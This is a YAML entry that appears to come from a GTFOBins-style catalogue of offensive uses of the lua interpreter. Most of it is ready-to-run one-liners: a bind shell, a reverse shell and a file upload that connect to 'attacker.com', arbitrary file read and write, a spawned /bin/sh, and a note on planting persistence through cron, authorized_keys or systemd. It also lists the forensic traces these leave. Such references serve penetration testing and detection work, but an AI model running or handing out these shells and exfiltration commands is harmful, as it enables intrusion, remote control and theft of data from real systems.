---
name: lua
capabilities:
- exec
- spawn
- read
- write
- upload
- download
- bind
- reverse-shell
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: bind-shell
  description: Open a bind shell on a listening port.
  capabilities:
  - bind
  - exec
  command: |-
    lua -e '
      local k=require("socket");
      local s=assert(k.bind("*",12345));
      local c=s:accept();
      while true do
        local r,x=c:receive();local f=assert(io.popen(r,"r"));
        local b=assert(f:read("*a"));c:send(b);
      end;c:close();f:close();'
  notes: This requires `lua-socket` to be available.
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: |-
    lua -e '
      local k=require("socket");
      local s=assert(k.bind("*",12345));
      local c=s:accept();
      local d,x=c:receive("*a");
      c:close();
      local f=io.open("/path/to/output-file", "wb");
      f:write(d);
      io.close(f);'
  notes: This requires `lua-socket` to be available.
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: lua -e 'local f=io.open("/path/to/input-file", "rb"); io.write(f:read("*a")); io.close(f);'
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: lua -e 'local f=io.open("/path/to/output-file", "wb"); f:write("DATA"); io.close(f);'
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: |-
    lua -e '
      local s=require("socket");
      local t=assert(s.tcp());
      t:connect("attacker.com",12345);
      while true do
        local r,x=t:receive();local f=assert(io.popen(r,"r"));
        local b=assert(f:read("*a"));t:send(b);
      end;
      f:close();t:close();'
  notes: This requires `lua-socket` to be available.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: lua -e 'os.execute("/bin/sh")'
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: |-
    lua -e '
      local f=io.open("/path/to/input-file", "rb")
      local d=f:read("*a")
      io.close(f);
      local s=require("socket");
      local t=assert(s.tcp());
      t:connect("attacker.com",12345);
      t:send(d);
      t:close();'
  notes: This requires `lua-socket` to be available.
references:
- https://gtfobins.github.io/gtfobins/lua/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
